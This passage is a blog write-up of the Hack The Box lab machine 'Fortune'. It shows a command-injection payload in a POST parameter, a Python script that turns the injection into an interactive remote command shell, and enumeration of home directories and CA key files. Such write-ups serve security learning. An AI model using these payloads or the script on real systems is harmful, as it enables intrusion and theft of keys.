<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Fortune - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Fortune"><a href="#Hack-The-Box-Fortune" class="headerlink" title="Hack The Box - Fortune"></a>Hack The Box - Fortune</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box <a href="/hack-the-box/lacasadepapel">LaCasaDePapel</a> it had <code>RCE</code> and client certificate generation to access a restricted <code>https</code> service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is <code>10.10.10.127</code>, I added it to <code>/etc/hosts</code> as <code>fortune.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/fortune/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC fortune.htb</code><br><img src="/images/hackthebox/fortune/1.png" alt=""><br>We have <code>http</code>, <code>https</code> on port 80, port 443 and we have <code>ssh</code> on port 22 so we will be focusing on the web services.</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p>The index page on <code>http://fortune.htb</code> is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :<br><img src="/images/hackthebox/fortune/2.png" alt=""><br><img src="/images/hackthebox/fortune/3.png" alt=""><br><img src="/images/hackthebox/fortune/4.png" alt=""><br>On <code>https://fortune.htb</code> we get a handshake error, this probably means that we need a client certificate.<br><img src="/images/hackthebox/fortune/5.png" alt=""></p>
<h2 id="RCE-Client-Certificate-Generation"><a href="#RCE-Client-Certificate-Generation" class="headerlink" title="RCE, Client Certificate Generation"></a>RCE, Client Certificate Generation</h2><p>Back to <code>http://fortune.htb</code> I intercepted the request with burp and there was only one parameter in the POST request called <code>db</code>, after trying some different things I could get <code>RCE</code> by appending a semi-colon <code>;</code> :<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/select</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: fortune.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://fortune.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">db=;pwd</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Date</span>: Fri, 02 Aug 2019 11:08:49 GMT</span><br><span class="line"><span class="attribute">Server</span>: OpenBSD httpd</span><br><span class="line"><span class="attribute">Content-Length</span>: 680</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Your fortune&lt;/title&gt;</span><br><span class="line">&lt;meta name='viewport' content='width=device-width, initial-scale=1'&gt;</span><br><span class="line">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Your fortune is:&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;&lt;pre&gt;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Bagbiter:</span></span><br><span class="line">	1. n.; Equipment or program that fails, usually</span><br><span class="line">intermittently.  2. adj.:  Failing hardware or software.  &amp;#34;This</span><br><span class="line">bagbiting system won&amp;#39;t let me get out of spacewar.&amp;#34;  Usage:  verges on</span><br><span class="line">obscenity.  Grammatically separable; one may speak of &amp;#34;biting the</span><br><span class="line">bag&amp;#34;.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,</span><br><span class="line">CHOMPER, CHOMPING.</span><br><span class="line">/var/appsrv/fortune</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/pre&gt;&lt;p&gt;</span><br><span class="line">&lt;p&gt;Try &lt;a href='/'&gt;again&lt;/a&gt;!&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>I couldn’t get a reverse shell, get <code>ssh</code> or read the user flag so we are going to enumerate the box through this <code>RCE</code> for some time.<br>I wrote a script to make it easier : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(payload)</span>:</span></span><br><span class="line">	post_data = &#123;<span class="string">"db"</span>:payload&#125;</span><br><span class="line">	req = requests.post(<span class="string">"http://10.10.10.127/select"</span>,data=post_data)</span><br><span class="line">	response = req.text</span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(response)</span>:</span></span><br><span class="line">	start = <span class="string">"rce_result"</span></span><br><span class="line">	end = <span class="string">"rce_result_end"</span></span><br><span class="line">	result = response[response.find(start)+len(start):response.rfind(end)]</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	rce = input(GREEN + <span class="string">"[?] command : "</span>)</span><br><span class="line">	payload = <span class="string">";echo rce_result;&#123;&#125;;echo rce_result_end"</span>.format(rce)</span><br><span class="line">	response = exploit(payload)</span><br><span class="line">	result = filter(response)</span><br><span class="line">	print(YELLOW + <span class="string">"[*] Result :"</span>)</span><br><span class="line">	print(result)</span><br></pre></td></tr></table></figure>
<p>This script takes the command to execute then sends the payload which is <code>;echo rce_result;COMMAND;echo rce_result_end</code> then it searches through the response and prints the string between <code>rce_result</code> and <code>rce_result_end</code> which is the output of our command.<br><img src="/images/hackthebox/fortune/6.png" alt=""><br>There are 3 users on the box : <code>bob</code>, <code>charlie</code> and <code>nfsuser</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[?] command : ls -la /home</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">total <span class="number">20</span></span><br><span class="line">drwxr-xr-x   <span class="number">5</span> root     wheel    <span class="number">512</span> Nov  <span class="number">2</span>  <span class="number">2018</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">13</span> root     wheel    <span class="number">512</span> Aug  <span class="number">2</span> <span class="number">05</span>:<span class="number">47</span> ..</span><br><span class="line">drwxr-xr-x   <span class="number">5</span> bob      bob      <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> bob</span><br><span class="line">drwxr-x---   <span class="number">3</span> charlie  charlie  <span class="number">512</span> Aug  <span class="number">2</span> <span class="number">06</span>:<span class="number">21</span> charlie</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> nfsuser  nfsuser  <span class="number">512</span> Nov  <span class="number">2</span>  <span class="number">2018</span> nfsuser</span><br></pre></td></tr></table></figure>
<p>In <code>bob</code>‘s home directory there was a directory called <code>ca</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[?] command : ls -la /home/bob</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">total <span class="number">48</span></span><br><span class="line">drwxr-xr-x  <span class="number">5</span> bob   bob    <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">5</span> root  wheel  <span class="number">512</span> Nov  <span class="number">2</span>  <span class="number">2018</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob   bob     <span class="number">87</span> Oct <span class="number">11</span>  <span class="number">2018</span> .Xdefaults</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob   bob    <span class="number">771</span> Oct <span class="number">11</span>  <span class="number">2018</span> .cshrc</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob   bob    <span class="number">101</span> Oct <span class="number">11</span>  <span class="number">2018</span> .cvsrc</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob   bob    <span class="number">359</span> Oct <span class="number">11</span>  <span class="number">2018</span> .login</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob   bob    <span class="number">175</span> Oct <span class="number">11</span>  <span class="number">2018</span> .mailrc</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob   bob    <span class="number">215</span> Oct <span class="number">11</span>  <span class="number">2018</span> .profile</span><br><span class="line">-rw-------  <span class="number">1</span> bob   bob     <span class="number">13</span> Nov  <span class="number">3</span>  <span class="number">2018</span> .psql_history</span><br><span class="line">drwx------  <span class="number">2</span> bob   bob    <span class="number">512</span> Nov  <span class="number">2</span>  <span class="number">2018</span> .ssh</span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob   bob    <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> ca</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob   bob    <span class="number">512</span> Nov  <span class="number">2</span>  <span class="number">2018</span> dba</span><br></pre></td></tr></table></figure>
<p>I enumerated that directory for some time and there was a directory called <code>intermediate</code> where I found a certificate and a key :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">[?] command : ls -la /home/bob/ca</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">total <span class="number">56</span></span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">5</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> ..</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> certs</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> crl</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob   <span class="number">115</span> Oct <span class="number">29</span>  <span class="number">2018</span> index.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob    <span class="number">21</span> Oct <span class="number">29</span>  <span class="number">2018</span> index.txt.attr</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob     <span class="number">0</span> Oct <span class="number">29</span>  <span class="number">2018</span> index.txt.old</span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> intermediate</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> newcerts</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob  <span class="number">4200</span> Oct <span class="number">29</span>  <span class="number">2018</span> openssl.cnf</span><br><span class="line">drwx------  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> private</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob     <span class="number">5</span> Oct <span class="number">29</span>  <span class="number">2018</span> serial</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob     <span class="number">5</span> Oct <span class="number">29</span>  <span class="number">2018</span> serial.old</span><br><span class="line"></span><br><span class="line">[?] command : ls -la /home/bob/ca/intermediate</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">total <span class="number">60</span></span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> ..</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> certs</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> crl</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob     <span class="number">5</span> Oct <span class="number">29</span>  <span class="number">2018</span> crlnumber</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> csr</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob   <span class="number">107</span> Oct <span class="number">29</span>  <span class="number">2018</span> index.txt</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob    <span class="number">21</span> Oct <span class="number">29</span>  <span class="number">2018</span> index.txt.attr</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> newcerts</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob  <span class="number">4328</span> Oct <span class="number">29</span>  <span class="number">2018</span> openssl.cnf</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> private</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob     <span class="number">5</span> Oct <span class="number">29</span>  <span class="number">2018</span> serial</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob     <span class="number">5</span> Oct <span class="number">29</span>  <span class="number">2018</span> serial.old</span><br><span class="line"></span><br><span class="line">[?] command : ls -la /home/bob/ca/intermediate/certs</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">total <span class="number">32</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> ..</span><br><span class="line">-r--r--r--  <span class="number">1</span> bob  bob  <span class="number">4114</span> Oct <span class="number">29</span>  <span class="number">2018</span> ca-chain.cert.pem</span><br><span class="line">-r--r--r--  <span class="number">1</span> bob  bob  <span class="number">1996</span> Oct <span class="number">29</span>  <span class="number">2018</span> fortune.htb.cert.pem</span><br><span class="line">-r--r--r--  <span class="number">1</span> bob  bob  <span class="number">2061</span> Oct <span class="number">29</span>  <span class="number">2018</span> intermediate.cert.pem</span><br><span class="line"></span><br><span class="line">[?] command : ls -la /home/bob/ca/intermediate/private</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">total <span class="number">20</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> bob  bob   <span class="number">512</span> Oct <span class="number">29</span>  <span class="number">2018</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">7</span> bob  bob   <span class="number">512</span> Nov  <span class="number">3</span>  <span class="number">2018</span> ..</span><br><span class="line">-r--------  <span class="number">1</span> bob  bob  <span class="number">1675</span> Oct <span class="number">29</span>  <span class="number">2018</span> fortune.htb.key.pem</span><br><span class="line">-rw-r--r--  <span class="number">1</span> bob  bob  <span class="number">3243</span> Oct <span class="number">29</span>  <span class="number">2018</span> intermediate.key.pem</span><br><span class="line"></span><br><span class="line">[?] command : cat /home/bob/ca/intermediate/certs/intermediate.cert.pem</span><br><span class="line">[*] Result :</span><br><span class="line"></span><br><span class="line">-----BEGIN CERTIFICATE-----                           </span><br><span class="line">MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex</span><br><span class="line">CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP</span><br><span 